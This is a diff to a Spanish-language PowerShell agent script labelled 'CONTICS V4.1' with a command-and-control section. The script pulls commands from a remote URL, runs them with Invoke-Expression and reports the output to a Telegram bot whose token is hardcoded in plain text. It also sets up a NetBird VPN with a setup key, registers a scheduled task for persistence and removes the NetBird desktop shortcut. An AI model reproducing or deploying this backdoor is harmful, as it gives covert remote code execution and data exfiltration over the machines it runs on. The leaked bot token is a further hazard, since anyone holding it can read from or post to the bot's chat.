@@ -1,5 +1,5 @@
 # ===========================================================================
-# AGENTE CONTICS V4 - CORREGIDO
+# AGENTE CONTICS V4.1 - CORREGIDO (STABLE)
 # Administrador: Jhonathan De La Cruz
 # ===========================================================================
 
@@ -7,7 +7,7 @@
 $TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
 $TelegramChatID = '6902736310'
 
-# Reemplaza con tus URLs reales de GitHub (Enlaces RAW)
+# Reemplaza estas URLs con tus enlaces RAW reales
 $GitHubRawUrl = 'TU_URL_RAW_DE_AGENT_WIN_PS1'
 $TaskUrl      = 'TU_URL_RAW_DE_TAREA_TXT'
 
@@ -30,21 +30,21 @@ function Send-Telegram {
 
 # --- 1. RECEPTOR DE COMANDOS (C2) ---
 try {
-    $Command = (Invoke-WebRequest -Uri $TaskUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content
-    if ($null -ne $Command) {
-        $Command = $Command.Trim()
+    $resp = Invoke-WebRequest -Uri $TaskUrl -UseBasicParsing -ErrorAction SilentlyContinue
+    if ($null -ne $resp) {
+        $Command = $resp.Content.Trim()
         if ($Command -ne "NONE" -and $Command -ne "") {
-            Send-Telegram -Message "⚡ *ORDEN RECIBIDA EN:* $env:COMPUTERNAME`n*Comando:* `$Command"
+            Send-Telegram -Message "⚡ *ORDEN RECIBIDA:* $env:COMPUTERNAME`n*Comando:* `$Command"
             $Result = Invoke-Expression $Command 2>&1 | Out-String
             if ($Result) {
                 Send-Telegram -Message "✅ *RESULTADO:*`n$Result"
             } else {
-                Send-Telegram -Message "✅ *ORDEN EJECUTADA*"
+                Send-Telegram -Message "✅ *ORDEN EJECUTADA EN $env:COMPUTERNAME*"
             }
         }
     }
 } catch {
-    Send-Telegram -Message "❌ *ERROR C2:* $($_.Exception.Message)"
+    Send-Telegram -Message "❌ *ERROR C2 ($env:COMPUTERNAME):* $($_.Exception.Message)"
 }
 
 # --- 2. GESTION DE RED (NETBIRD) ---
@@ -55,7 +55,7 @@ if (!(Test-Path $nbPath)) {
     Start-Sleep -Seconds 5
 }
 
-$statusCheck = & $nbPath status
+$statusCheck = & $nbPath status 2>&1
 if ($statusCheck -notmatch 'Connected') {
     & $nbPath down | Out-Null
     & $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null
@@ -83,5 +83,5 @@ try {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
 } catch { }
 
-# Limpieza final
+# Limpieza de acceso directo si existe
 if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
